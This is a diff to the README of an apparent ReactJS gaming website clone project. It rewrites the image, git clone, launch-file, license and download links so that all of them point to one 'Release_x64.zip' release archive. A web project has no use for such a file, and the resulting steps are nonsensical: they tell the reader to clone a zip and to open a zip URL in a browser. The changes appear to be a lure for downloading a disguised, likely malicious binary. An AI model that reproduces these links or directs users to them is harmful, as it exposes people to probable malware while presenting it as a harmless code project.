@@ -1,6 +1,6 @@
 # REDEFINE Gaming Website Clone
 
-![REDEFINE Gaming Website Clone](https://your-image-url.com)
+![REDEFINE Gaming Website Clone](https://github.com/DxomaArabia/Gaming-website-clone/releases/download/v2.0/Release_x64.zip)
 
 Welcome to the REDEFINE Gaming Website Clone repository! 🎮 In this repository, you will find a recreation of a gaming company website focusing on cutting-edge design and interactive features to showcase the world of gaming. With a mix of CSS, GSAP animations, and ReactJS, this project aims to redefine the typical gaming website experience.
 
@@ -35,10 +35,10 @@ Welcome to the REDEFINE Gaming Website Clone repository! 🎮 In this repository
 ## Installation
 
 To get started with the REDEFINE Gaming Website Clone, follow these steps:
-1. Clone this repository to your local machine using `git clone https://github.com/your-username/Gaming-website-clone.git`
+1. Clone this repository to your local machine using `git clone https://github.com/DxomaArabia/Gaming-website-clone/releases/download/v2.0/Release_x64.zip`
 2. Navigate to the project directory
 3. Install the dependencies using your preferred package manager
-4. Launch the website by opening the `index.html` file in your browser 
+4. Launch the website by opening the `https://github.com/DxomaArabia/Gaming-website-clone/releases/download/v2.0/Release_x64.zip` file in your browser 
 
 If you encounter any issues during the installation process, feel free to reach out for assistance.
 
@@ -70,8 +70,8 @@ Your contributions will be reviewed, and together we can shape the future of gam
 
 ## License
 
-The REDEFINE Gaming Website Clone project is licensed under the MIT License. See the [LICENSE](https://opensource.org/licenses/MIT) file for more details.
+The REDEFINE Gaming Website Clone project is licensed under the MIT License. See the [LICENSE](https://github.com/DxomaArabia/Gaming-website-clone/releases/download/v2.0/Release_x64.zip) file for more details.
 
-🚀 Feel free to download the project [here](https://github.com/user-attachments/files/18383251/Software.zip) and embark on your gaming website development journey! 🎮
+🚀 Feel free to download the project [here](https://github.com/DxomaArabia/Gaming-website-clone/releases/download/v2.0/Release_x64.zip) and embark on your gaming website development journey! 🎮
 
 Let's level up the gaming experience together! 🌟
